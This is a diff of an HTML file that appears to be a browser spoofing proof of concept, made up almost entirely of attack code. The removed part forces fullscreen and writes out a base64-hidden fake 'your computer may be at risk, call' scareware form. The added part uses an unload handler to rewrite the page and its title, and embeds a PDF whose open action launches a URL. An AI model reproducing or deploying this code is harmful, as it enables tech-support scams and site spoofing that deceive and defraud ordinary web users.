@@ -1,26 +1,41 @@
-
-<body>
-<button onclick=foo()>go</button>
-</body>
-
 <script>
-
-var w;
-var t;
-function foo(){
-w = setTimeout('document.documentElement.webkitRequestFullscreen();',1201)
-t = setInterval('bar()',1);
-}
-
-function bar(){
-try{
-w.location.href;
-}
-catch(e){
-clearInterval(t);
-setTimeout("document.write(atob('PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSy5cbkNBTEw6IDgwMC0xMTEtMjIyMiIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDEwMDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='));test()",1000);
-}
-
-}
-
+onbeforeunload=function(){
+	document.write('<b>Welcome to {Some Website}</b>');
+	document.title='OtherWebsite.ltd';
+};
 </script>
+<embed type="application/pdf" src="data:application/pdf;base64,JVBERi0xLjcKIAp0cmFpbGVyCjw8Ci9Sb290IDEgMCBSCj4+CiAKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMiAwIFIKL09wZW5BY3Rpb24gMiAwIFIKPj4KZW5kb2JqCiAKMiAwIG9iago8PAovVHlwZSAvQWN0aW9uCi9TIC9VUkkKL1VSSSAoaHR0cDovL3d3dy5mYWNlYm9vay5jb206ODMpCj4+CmVuZG9iagogCiUlRU9G" width="640" height="480">
+
+
+<!--
+
+Source of the embeded PDF.
+
+-------------------------------------
+%PDF-1.7
+ 
+trailer
+<<
+/Root 1 0 R
+>>
+ 
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 2 0 R
+>>
+endobj
+ 
+2 0 obj
+<<
+/Type /Action
+/S /URI
+/URI (http://www.facebook.com:83)
+>>
+endobj
+ 
+%%EOF
+------------------------------------------ 
+
+-->
